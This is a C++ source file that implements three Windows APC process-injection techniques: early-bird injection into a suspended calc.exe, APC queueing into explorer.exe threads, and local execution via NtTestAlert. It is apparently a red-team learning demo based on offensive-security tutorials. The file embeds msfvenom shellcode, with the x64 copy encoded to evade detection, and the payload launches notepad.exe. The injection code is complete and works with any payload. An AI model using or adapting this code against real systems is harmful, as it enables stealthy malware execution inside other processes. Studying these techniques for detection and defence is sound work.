// APCInjections.cpp : all apc injection techniques in one file
//

#include <iostream>

//#pragma warning( disable : 4505 4189)

#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include <optional>


class Shellcode
{
public:
	static const unsigned char* Create()
	{
	#ifdef _X86_
		return x86_notepad;
	#else
		return x64_notepad;
	#endif
	}

	// msfvenom - p windows/exec cmd=notepad.exe -a x86 --platform win -f c
	static constexpr unsigned char x86_notepad[] =
		"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
		"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
		"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
		"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
		"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
		"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
		"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
		"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
		"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
		"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d"
		"\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
		"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
		"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
		"\xff\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00";

	// msfvenom -p windows/x64/exec cmd=notepad.exe -a x64 --platform win -f c -e x64/zutto_dekiru 
	static constexpr unsigned char x64_notepad[] =
		"\x48\x31\xff\x54\xda\xc3\x40\xb7\x23\x41\x5c\x48\xbd\x1e"
		"\x54\x39\xe1\xc0\xbc\x84\xe1\x66\x41\x81\xe4\x40\xf6\x49"
		"\x0f\xae\x04\x24\x4d\x8b\x4c\x24\x08\x48\xff\xcf\x49\x31"
		"\x6c\xf9\x2e\x48\x85\xff\x75\xf3\xe2\x1c\xba\x05\x30\x54"
		"\x44\xe1\x1e\x54\x78\xb0\x81\xec\xd6\xb0\x48\x1c\x08\x33"
		"\xa5\xf4\x0f\xb3\x7e\x1c\xb2\xb3\xd8\xf4\x0f\xb3\x3e\x1c"
		"\xb2\x93\x90\xf4\x8b\x56\x54\x1e\x74\xd0\x09\xf4\xb5\x21"
		"\xb2\x68\x58\x9d\xc2\x90\xa4\xa0\xdf\x9d\x34\xa0\xc1\x7d"
		"\x66\x0c\x4c\x15\x68\xa9\x4b\xee\xa4\x6a\x5c\x68\x71\xe0"
		"\x10\x37\x04\x69\x1e\x54\x39\xa9\x45\x7c\xf0\x86\x56\x55"
		"\xe9\xb1\x4b\xf4\x9c\xa5\x95\x14\x19\xa8\xc1\x6c\x67\xb7"
		"\x56\xab\xf0\xa0\x4b\x88\x0c\xa9\x1f\x82\x74\xd0\x09\xf4"
		"\xb5\x21\xb2\x15\xf8\x28\xcd\xfd\x85\x20\x26\xb4\x4c\x10"
		"\x8c\xbf\xc8\xc5\x16\x11\x00\x30\xb5\x64\xdc\xa5\x95\x14"
		"\x1d\xa8\xc1\x6c\xe2\xa0\x95\x58\x71\xa5\x4b\xfc\x98\xa8"
		"\x1f\x84\x78\x6a\xc4\x34\xcc\xe0\xce\x15\x61\xa0\x98\xe2"
		"\xdd\xbb\x5f\x0c\x78\xb8\x81\xe6\xcc\x62\xf2\x74\x78\xb3"
		"\x3f\x5c\xdc\xa0\x47\x0e\x71\x6a\xd2\x55\xd3\x1e\xe1\xab"
		"\x64\xa9\x7a\xbd\x84\xe1\x1e\x54\x39\xe1\xc0\xf4\x09\x6c"
		"\x1f\x55\x39\xe1\x81\x06\xb5\x6a\x71\xd3\xc6\x34\x7b\x4c"
		"\x31\x43\x48\x15\x83\x47\x55\x01\x19\x1e\xcb\x1c\xba\x25"
		"\xe8\x80\x82\x9d\x14\xd4\xc2\x01\xb5\xb9\x3f\xa6\x0d\x26"
		"\x56\x8b\xc0\xe5\xc5\x68\xc4\xab\xec\x8f\xaf\xc8\xe1\x91"
		"\x7f\x30\x17\x84\xb8\xd9\x84\x70";
};

class IALWinApi
{
public:
	virtual bool IsProcessRunning(std::wstring_view ProcessName) = 0;
	virtual void KillProcess(std::wstring_view ProcessName) = 0;
};

class ALWinApi : IALWinApi
{
public:
	bool IsProcessRunning(std::wstring_view ProcessName)
	{
		return GetProcessEntry(ProcessName).has_value() ? true : false;
	}

	void KillProcess(std::wstring_view ProcessName)
	{
		if (const auto processEntry = GetProcessEntry(ProcessName); processEntry.has_value())
		{
			const HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processEntry.value().th32ProcessID);
			if (hProcess == NULL)
				return;

			TerminateProcess(hProcess, 0);
			CloseHandle(hProcess);
		}
	}

private:
	std::optional<PROCESSENTRY32> GetProcessEntry(std::wstring_view ProcessName)
	{
		PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (Process32First(snapshot, &processEntry))
		{
			while (ProcessName.compare(processEntry.szExeFile) != 0)
			{
				if (Process32Next(snapshot, &processEntry) == FALSE)
					return {};
			}
		}
		return processEntry;
	}
};

class APCInjection
{
public:
	// based on https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection
	static void ApcEarlyBirdInjection()
	{
		auto& shellcode = Shellcode::x64_notepad;
		SIZE_T shellSize = sizeof shellcode;
		STARTUPINFOA si{};
		PROCESS_INFORMATION pi{};

		CreateProcessA("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
		HANDLE victimProcess = pi.hProcess;
		HANDLE threadHandle = pi.hThread;

		LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
		WriteProcessMemory(victimProcess, shellAddress, shellcode, shellSize, NULL);

		QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);

		ResumeThread(threadHandle);
		Sleep(500);
	}

	// based on https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection
	static void ApcQueueShellcodeInjection()
	{
		//auto unsigned shellcode = Shellcode::x64_notepad; // not working
		// find process which would be used for injection (explorer.exe)
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
		if (Process32First(snapshot, &processEntry))
		{
			while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0)
			{
				Process32Next(snapshot, &processEntry);
			}
		}

		// write shellcode into process memory (virtual address space)
		auto& shellcode = Shellcode::x64_notepad;
		SIZE_T shellSize = sizeof shellcode;
		HANDLE victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
		LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
		WriteProcessMemory(victimProcess, shellAddress, shellcode, shellSize, NULL);

		// get all victims process thread ids
		HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
		std::vector<DWORD> threadIds;
		if (Thread32First(processSnapshot, &threadEntry)) {
			do {
				if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
					threadIds.push_back(threadEntry.th32ThreadID);
				}
			} while (Thread32Next(processSnapshot, &threadEntry));
		}

		// iterate through victim process threads and add apc routine for each of them
		// target victim thread has to be alertable (explorer.exe has lot of threads and there is chance that at least one would be alertable)
		// guess: sleep here doesn't have impact on alertable thread state but is necessary for execution of apc time to scheduler run alertable thread before main process exit
		HANDLE threadHandle;
		for (DWORD threadId : threadIds) {
			threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
			QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
			Sleep(500);
		}
	}

	// based on https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert
	static void ApcNtTestAlertInjection()
	{
		auto& shellcode = Shellcode::x64_notepad;
		auto NtTestAlert = GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert");
		SIZE_T shellSize = sizeof(shellcode);
		LPVOID shellAddress = VirtualAlloc(NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

		WriteProcessMemory(GetCurrentProcess(), shellAddress, shellcode, shellSize, NULL);

		PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
		QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);

		NtTestAlert();
	}
};

int main()
{
	//APCInjection::ApcEarlyBirdInjection();
	//APCInjection::ApcQueueShellcodeInjection();
	APCInjection::ApcNtTestAlertInjection();
}

